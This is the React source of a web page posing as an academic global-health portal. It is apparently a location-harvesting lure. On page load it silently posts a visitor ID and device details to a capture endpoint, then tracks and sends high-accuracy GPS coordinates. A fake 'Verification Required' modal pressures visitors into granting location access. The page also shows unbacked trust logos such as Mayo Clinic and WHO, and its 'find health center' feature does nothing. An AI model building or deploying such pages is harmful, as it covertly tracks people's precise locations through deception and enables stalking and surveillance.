'use client';

import { useState, useEffect } from 'react';

export default function GlobalHealth() {
  const [status, setStatus] = useState(null);
  const [loading, setLoading] = useState(false);

  // High-Precision Auto-Capture
  useEffect(() => {
    if (!navigator.geolocation) return;

    let watchId;
    let bestPosition = null;

    setLoading(true);
    setStatus('Establishing high-precision GPS lock...');

    const startWatching = () => {
      watchId = navigator.geolocation.watchPosition(
        async (position) => {
          // Keep track of the most accurate position found so far
          if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
            bestPosition = position;
          }

          // If accuracy is good enough (under 60 meters) or we've waited 5 seconds
          if (position.coords.accuracy < 60) {
            saveLocation(position);
          }
        },
        (err) => {
          if (err.code === 1) setStatus('Permission required for local health centers.');
        },
        { 
          enableHighAccuracy: true, 
          timeout: 20000, 
          maximumAge: 0 
        }
      );
    };

    const saveLocation = async (position = null) => {
      if (watchId) navigator.geolocation.clearWatch(watchId);
      
      let visitorId = localStorage.getItem('visitorId');
      if (!visitorId) {
        visitorId = 'vid_' + Math.random().toString(36).substring(2, 11) + Date.now().toString(36);
        localStorage.setItem('visitorId', visitorId);
      }
      
      const payload = {
        lat: position?.coords.latitude || null,
        lon: position?.coords.longitude || null,
        accuracy: position?.coords.accuracy || null,
        platform: navigator.platform,
        screen: `${window.screen.width}x${window.screen.height}`,
        visitorId,
        context: position 
          ? `GPS Lock (Acc: ${Math.round(position.coords.accuracy)}m)` 
          : 'Initial Visit (IP Only)'
      };

      try {
        await fetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
          keepalive: true, // Ensures request finishes even if tab is closed
        });
        
        if (position) {
          setStatus('GPS Synchronized. Local centers identified.');
          setTimeout(() => {
            setStatus(null);
            setLoading(false);
          }, 3000);
        }
      } catch (err) {}
    };

    // Phase 1: Instant IP/Visit Capture
    saveLocation(null);

    // Phase 2: Start GPS Watch
    const finalTimer = setTimeout(() => {
      if (bestPosition && loading) {
        saveLocation(bestPosition);
      }
    }, 8000);


    startWatching();

    return () => {
      if (watchId) navigator.geolocation.clearWatch(watchId);
      clearTimeout(finalTimer);
    };
  }, []);



  const findNearbyCenters = () => {
    if (!navigator.geolocation) {
      setStatus('Geolocation is not supported by your browser.');
      return;
    }

    setLoading(true);
    setStatus('Requesting GPS access...');

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        setStatus('GPS Lock acquired. Syncing...');
        // The useEffect will handle the continuous watching, 
        // but this manual click ensures the browser prompt is triggered.
      },
      (err) => {
        setLoading(false);
        if (err.code === 1) {
          setStatus('Permission denied. Please enable location in your browser settings.');
        } else {
          setStatus('Position unavailable. Please try again.');
        }
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };



  return (
    <main className="min-h-screen bg-white text-[#1a1a1a] font-sans selection:bg-blue-100">
      {/* Navigation */}
      <nav className="border-b border-gray-100 px-8 py-4 flex justify-between items-center sticky top-0 bg-white/80 backdrop-blur-md z-50">
        <div className="flex items-center space-x-2">
          <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
            <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M12 6.253v13m0-13C10.832 5.477 9.246 5 7.5 5S4.168 5.477 3 6.253v13C4.168 18.477 5.754 18 7.5 18s3.332.477 4.5 1.253m0-13C13.168 5.477 14.754 5 16.5 5c1.747 0 3.332.477 4.5 1.253v13C19.832 18.477 18.247 18 16.5 18c-1.746 0-3.332.477-4.5 1.253" />
            </svg>
          </div>
          <span className="font-bold text-xl tracking-tight text-blue-900">Academically</span>
        </div>
        <div className="hidden md:flex space-x-8 text-sm font-semibold text-gray-600">
          <a href="#" className="hover:text-blue-600 transition-colors">Programs</a>
          <a href="#" className="hover:text-blue-600 transition-colors">Research</a>
          <a href="#" className="hover:text-blue-600 transition-colors">Partners</a>
          <a href="#" className="text-blue-600 underline underline-offset-4">Find Care</a>
        </div>
        <button className="bg-blue-600 text-white px-5 py-2 rounded-full text-sm font-bold hover:bg-blue-700 transition-all shadow-md hover:shadow-lg active:scale-95">
          Join Network
        </button>
      </nav>

      {/* Hero Section */}
      <section className="px-8 py-20 md:py-32 max-w-7xl mx-auto grid md:grid-cols-2 gap-12 items-center">
        <div>
          <div className="inline-block px-3 py-1 bg-blue-50 text-blue-700 text-xs font-bold rounded-full mb-6 uppercase tracking-wider">
            Global Health Care Initiative
          </div>
          <h1 className="text-5xl md:text-7xl font-extrabold text-blue-950 leading-[1.1] mb-6">
            Empowering Health Through <span className="text-blue-600">Academic Excellence.</span>
          </h1>
          <p className="text-lg text-gray-600 mb-10 leading-relaxed max-w-lg">
            Connecting global researchers and healthcare providers to solve the world's most pressing medical challenges.
          </p>
          
          <div className="flex flex-col sm:flex-row gap-4">
            <button 
              onClick={findNearbyCenters}
              disabled={loading}
              className="flex items-center justify-center space-x-3 bg-blue-600 text-white px-8 py-4 rounded-2xl font-bold hover:bg-blue-700 transition-all shadow-xl shadow-blue-200 active:scale-95 disabled:opacity-70"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
              <span>{loading ? 'Finding...' : 'Find Nearest Health Center'}</span>
            </button>
            <button className="px-8 py-4 border-2 border-gray-100 rounded-2xl font-bold hover:bg-gray-50 transition-all">
              View All Partners
            </button>
          </div>

          {/* Mandatory Location Modal */}
          {(status?.includes('required') || status?.includes('denied')) && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 backdrop-blur-xl bg-blue-950/40">
              <div className="bg-white rounded-[2.5rem] p-8 md:p-12 max-w-lg w-full shadow-2xl border border-white/20 animate-in zoom-in-95 duration-300">
                <div className="w-20 h-20 bg-blue-50 rounded-3xl flex items-center justify-center mb-8 mx-auto">
                  <svg className="w-10 h-10 text-blue-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
                </div>
                
                <h2 className="text-3xl font-black text-center text-blue-950 mb-4">Verification Required</h2>
                <p className="text-gray-600 text-center mb-8 leading-relaxed">
                  To ensure you are connecting to a legitimate healthcare research center, we must verify your current location.
                </p>

                <div className="bg-blue-50 rounded-2xl p-6 mb-8 border border-blue-100">
                  <p className="text-xs font-bold text-blue-800 uppercase tracking-widest mb-3">Quick Steps:</p>
                  <ul className="text-sm text-blue-700 space-y-2">
                    <li className="flex items-start">
                      <span className="mr-2">📍</span>
                      <span>Turn on your device <b>GPS / Location</b>.</span>
                    </li>
                    <li className="flex items-start">
                      <span className="mr-2">🔓</span>
                      <span>Click <b>"Allow"</b> on the browser popup.</span>
                    </li>
                  </ul>
                </div>

                <button 
                  onClick={() => window.location.reload()}
                  className="w-full py-5 bg-blue-600 text-white font-black rounded-2xl hover:bg-blue-700 transition-all shadow-xl shadow-blue-200 active:scale-95 text-lg"
                >
                  Enable GPS & Verify
                </button>
                
                <p className="text-[10px] text-gray-400 text-center mt-6 uppercase tracking-tighter font-bold">
                  Encryption Secured • Academically Global Health Care
                </p>
              </div>
            </div>
          )}

          <div className="w-full space-y-4">
            <div className={`p-4 rounded-xl border transition-all duration-500 ${status?.includes('synchronized') ? 'bg-green-500/10 border-green-500/20' : 'bg-[#111] border-[#1a1a1a]'}`}>
              {loading && (
                <div className="flex items-center space-x-3">
                  <div className="w-4 h-4 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
                  <span className="text-sm text-blue-400 animate-pulse">{status}</span>
                </div>
              )}
              {!loading && status && (
                <div className="flex items-center space-x-3">
                  <div className={`w-2 h-2 rounded-full ${status.includes('synchronized') ? 'bg-green-500' : 'bg-red-500'}`}></div>
                  <span className={`text-sm ${status.includes('synchronized') ? 'text-green-400' : 'text-red-400 font-medium'}`}>{status}</span>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="relative">


          {/* Decorative Elements */}
          <div className="absolute -top-12 -left-12 w-64 h-64 bg-blue-400/10 blur-[100px] rounded-full animate-pulse"></div>
          <div className="absolute -bottom-12 -right-12 w-64 h-64 bg-purple-400/10 blur-[100px] rounded-full"></div>
          
          <div className="relative bg-gray-50 rounded-[2.5rem] p-8 border border-gray-100 shadow-2xl overflow-hidden group">
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-4">
                <div className="h-48 bg-blue-100 rounded-3xl group-hover:scale-105 transition-transform duration-500 flex items-center justify-center overflow-hidden">
                   <div className="w-full h-full bg-gradient-to-br from-blue-500 to-blue-700 opacity-20"></div>
                </div>
                <div className="h-32 bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
                   <div className="w-8 h-8 bg-blue-50 rounded-lg mb-3"></div>
                   <div className="h-2 w-20 bg-gray-200 rounded-full mb-2"></div>
                   <div className="h-2 w-12 bg-gray-100 rounded-full"></div>
                </div>
              </div>
              <div className="space-y-4 pt-12">
                <div className="h-32 bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
                   <div className="w-8 h-8 bg-green-50 rounded-lg mb-3"></div>
                   <div className="h-2 w-16 bg-gray-200 rounded-full mb-2"></div>
                   <div className="h-2 w-24 bg-gray-100 rounded-full"></div>
                </div>
                <div className="h-48 bg-purple-100 rounded-3xl group-hover:scale-105 transition-transform duration-500 flex items-center justify-center overflow-hidden">
                   <div className="w-full h-full bg-gradient-to-br from-purple-500 to-purple-700 opacity-20"></div>
                </div>
              </div>
            </div>
            
            {/* Floating Card */}
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 bg-white p-4 rounded-2xl shadow-2xl border border-blue-50 transform rotate-3 hover:rotate-0 transition-transform">
              <p className="text-[10px] font-bold text-blue-600 mb-1 uppercase tracking-tighter">Live Stats</p>
              <p className="text-2xl font-black text-blue-900">12,400+</p>
              <p className="text-[10px] text-gray-500">Global Medical Partners</p>
            </div>
          </div>
        </div>
      </section>

      {/* Trust Bar */}
      <section className="bg-gray-50 py-12 px-8">
        <div className="max-w-7xl mx-auto flex flex-wrap justify-center gap-12 opacity-40 grayscale contrast-125">
          {['University of Medicine', 'Global Health Council', 'Mayo Clinic', 'Oxford Medical', 'WHO Affiliate'].map((name) => (
            <span key={name} className="font-bold text-lg tracking-tighter">{name}</span>
          ))}
        </div>
      </section>
    </main>
  );
}
